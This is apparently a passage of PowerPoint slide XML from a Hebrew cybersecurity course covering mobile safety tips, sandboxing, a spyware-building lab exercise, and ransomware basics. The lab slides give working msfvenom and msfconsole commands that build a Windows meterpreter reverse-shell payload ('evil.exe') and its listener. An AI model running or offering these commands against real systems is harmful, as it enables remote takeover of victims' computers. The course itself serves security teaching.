              <a:t>   א. להוריד אפליקציות רק מחנויות אפליקציות רשמיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ב. להיזהר מהענקת הרשאות גישה מיותרות לאפליקציות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ג. לעדכן את מערכת ההפעלה והאפליקציות באופן קבוע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ד. להשתמש בתוכנות אנטי-וירוס ואבטחת מידע גם על מכשירים ניידים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26204627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9E24213-584A-4949-A0DB-4F97FA4537F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6957390" y="642594"/>
            <a:ext cx="4167809" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{13B017BE-3616-4ACE-A5D5-27F5E7F48DFD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Sandbox </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מאפשר להריץ תוכנות חשודות בסביבה מבודדת מהמערכת הראשית, כך שניתן לנתח את פעולתן מבלי לסכן את המערכת. היתרון המרכזי הוא זיהוי פעולות זדוניות לפני שהן פוגעות במערכת בפועל. עם זאת, המגבלות כוללות את העובדה שחלק </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>מהרוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> המתקדמות מתוכננות לזהות כשהן רצות בסביבה מבודדת ולהימנע מפעולות זדוניות עד שהן פועלות בסביבה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אמיתית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37510614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3F37F9E-9436-444E-97A1-43B6D2BE9812}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="0"/>
            <a:ext cx="5181600" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>תירגול</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ביצירת רוגלה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0BD36F4B-E2DE-4CED-BEC7-C0EE7B2A87D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1168842"/>
            <a:ext cx="10058400" cy="5530132"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 1: יצירת רוגלה בסיסית:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נשתמש בכלי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי ליצור רוגלה בסיסית. הכלי הזה הוא חלק מ-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit Framework </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ומאפשר ליצור </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>payloads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השתמש בפקודה הבאה כדי ליצור קובץ רוגלה בסיומת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -p windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> LHOST=&lt;YOUR_IP&gt; LPORT=4444 -f exe &gt; /root/Desktop/evil.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>LHOST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Kali Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלך (רצוי להשתמש בכתובת מקומית במבחן בסביבה סגורה).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>LPORT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הפורט שבו הרוגלה תתחבר בחזרה ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Kali Linux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> (בדוגמה זו 4444).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 2: הגדרת מאזין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Listener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי שהרוגלה תוכל לשלוח מידע חזרה אליך, עליך להגדיר מאזין ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Kali Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פתח טרמינל וכתוב </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאחר שה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Framework </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נטען, הפעל את המאזין עם הפקודות הבאות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>use exploit/multi/handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set payload windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set LHOST &lt;YOUR_IP&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set LPORT 4444</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2474614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824494-A785-463C-85BD-3CE72E6EF4CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3876260" y="642594"/>
            <a:ext cx="7248939" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>תירגול</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ביצירת רוגלה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{55A551F3-A628-4097-9C87-B4AD7E2813CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 3: הפעלת הרוגלה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לבדוק </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>שהכל</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עובד, עליך להריץ את הקובץ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>evil.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על מערכת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במכונה וירטואלית או במכונה נפרדת (כמובן לא על מחשב אישי יומיומי).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 4: אינטראקציה עם הרוגלה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הכל</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עבד כשורה, ברגע שהקובץ יופעל, המאזין ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Kali Linux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אמור להתחבר למערכת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Windows</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36689935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C25F2216-B823-40E0-9C7B-7D3D50A225BB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2252207"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="8000" dirty="0"/>
              <a:t>תוכנת כופר</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20281665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3F4189E-6B82-4DAA-B2C0-FDF63C65ACE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6708912" y="642594"/>
            <a:ext cx="4416287" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מהי תוכנת כופר?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{77CE37C2-1DB1-49DA-ABED-54ECD2E5428D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066799" y="2421172"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוכנת כופר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא סוג של תוכנה זדונית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Malware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמצפינה את הקבצים במערכת של הקורבן ומונעת ממנו גישה אליהם. לאחר ההצפנה, התוקף דורש כופר (לרוב בתשלום במטבעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>קריפטוגרפיים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ביטקוין</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>) בתמורה למפתח ההצפנה שיאפשר לשחרר את הקבצים. אם הקורבן לא משלם את הכופר, התוקף מאיים שהקבצים יישארו נעולים או ימחקו.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12212358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306E543-EDC6-4C08-8BFF-46971FB77B86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5138530" y="642594"/>
            <a:ext cx="5986670" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך תוכנת כופר פועלת?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D72CFCF-E23A-485F-8863-FC3B839F1E8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוכנת כופר פועלת בשלבים הבאים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הפצה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף שולח את תוכנת הכופר דרך אימיילים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, קישורים זדוניים, או הורדות מזויפות מאתרים לא אמינים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקנה והפעלה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לאחר שהתוכנה חודרת למערכת, היא מופעלת ומתחילה לפעול ברקע ללא ידיעת הקורבן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הצפנה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוכנה סורקת את המערכת אחר קבצים חשובים כמו מסמכים, תמונות, ומסדי נתונים, ומצפינה אותם בעזרת אלגוריתם הצפנה חזק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דרישת כופר:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ברגע שההצפנה הושלמה, התוכנה מציגה הודעה שמיידעת את הקורבן שהקבצים שלו נעולים ודורשת ממנו לשלם כופר כדי לשחזר את הגישה אליהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תשלום או הפסד:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אם הקורבן משלם את הכופר, הוא מקבל (לפעמים) את מפתח ההצפנה לשחרור הקבצים. אם לא, הקבצים נשארים מוצפנים או נמחקים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9715014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401E4F3-9674-419E-81C9-1544340DABBE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2643808" y="642594"/>
            <a:ext cx="8481391" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמאות לתוכנות כופר מפורסמות:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CEE23516-571D-4EB9-8856-830208D6996F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>NotPetya</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> (2017)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נראתה בתחילה כעוד תוכנת כופר, אך למעשה הייתה תוכנה הרסנית שתפקידה העיקרי היה לגרום לנזק ולא לגבות כופר. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>NotPetya</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> השפיעה על חברות רבות ברחבי העולם, כולל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Maersk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, אחת מחברות ההובלה הגדולות בעולם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Locky</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> (2016)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אחת מתוכנות הכופר הראשונות שהופצה בקנה מידה גדול. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Locky</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הופצה בעיקר באמצעות מיילים זדוניים שכביכול היו מסמכים לגיטימיים. לאחר פתיחת המסמך, תוכנת הכופר הותקנה על המחשב והצפינה את הקבצים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
